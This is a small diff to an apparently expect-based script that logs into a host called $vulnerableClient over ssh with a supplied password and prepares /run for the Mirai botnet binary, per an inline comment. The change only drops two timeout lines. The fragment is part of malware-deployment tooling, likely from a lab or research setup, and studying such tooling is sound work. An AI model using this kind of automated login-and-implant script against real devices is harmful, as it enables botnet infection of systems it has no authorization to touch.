@@ -16,10 +16,8 @@ spawn ssh $username@$vulnerableClient
 
 expect "*continue connecting (yes/no*)? "
 send "yes\r"
-set timeout 120
 expect " password: "
 send "$password\r"
-set timeout 120
 
 # mount filesystem /run with exec option  -Mirai will be at /run/a
 expect "*:~# "
